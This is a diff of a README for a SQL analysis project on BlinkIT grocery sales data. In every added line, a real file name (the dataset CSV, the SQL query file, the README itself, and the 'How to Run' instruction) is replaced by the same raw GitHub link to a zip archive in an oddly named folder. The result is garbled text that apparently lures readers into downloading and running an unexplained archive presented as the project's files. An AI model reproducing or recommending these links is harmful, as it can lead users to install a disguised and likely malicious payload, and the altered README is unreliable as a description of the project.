@@ -16,7 +16,7 @@ To analyze BlinkIT’s grocery sales data and deliver actionable insights to hel
 
 ## 📌 Dataset Overview
 
-**Filename**: `BlinkIT Grocery Data.csv`  
+**Filename**: `BlinkIT Grocery https://github.com/Lokesh-Bathala/BlinkIT-Data-Analysis-using-SQL/raw/refs/heads/main/sulphostannate/I-Blink-using-SQL-Data-Analysis-3.2.zip`  
 **Rows**: ~ records  
 **Columns**:
 
@@ -85,9 +85,9 @@ To analyze BlinkIT’s grocery sales data and deliver actionable insights to hel
 ## 📂 Project Structure
 
 📁 BlinkIT-SQL-Analysis
-├── 📄 BlinkIT Grocery Data.csv ← Original dataset
-├── 📄 BlinkIT SQL QUERY.sql ← All analysis SQL queries
-├── 📄 README.md ← This file
+├── 📄 BlinkIT Grocery https://github.com/Lokesh-Bathala/BlinkIT-Data-Analysis-using-SQL/raw/refs/heads/main/sulphostannate/I-Blink-using-SQL-Data-Analysis-3.2.zip ← Original dataset
+├── 📄 BlinkIT SQL https://github.com/Lokesh-Bathala/BlinkIT-Data-Analysis-using-SQL/raw/refs/heads/main/sulphostannate/I-Blink-using-SQL-Data-Analysis-3.2.zip ← All analysis SQL queries
+├── 📄 https://github.com/Lokesh-Bathala/BlinkIT-Data-Analysis-using-SQL/raw/refs/heads/main/sulphostannate/I-Blink-using-SQL-Data-Analysis-3.2.zip ← This file
 
 
 
@@ -96,7 +96,7 @@ To analyze BlinkIT’s grocery sales data and deliver actionable insights to hel
 ## 🚀 How to Run
 
 1. Import the CSV into your SQL tool (e.g., MySQL, SQL Server, Azure Data Studio)
-2. Run `BlinkIT SQL QUERY.sql`
+2. Run `BlinkIT SQL https://github.com/Lokesh-Bathala/BlinkIT-Data-Analysis-using-SQL/raw/refs/heads/main/sulphostannate/I-Blink-using-SQL-Data-Analysis-3.2.zip`
 
 ---
 
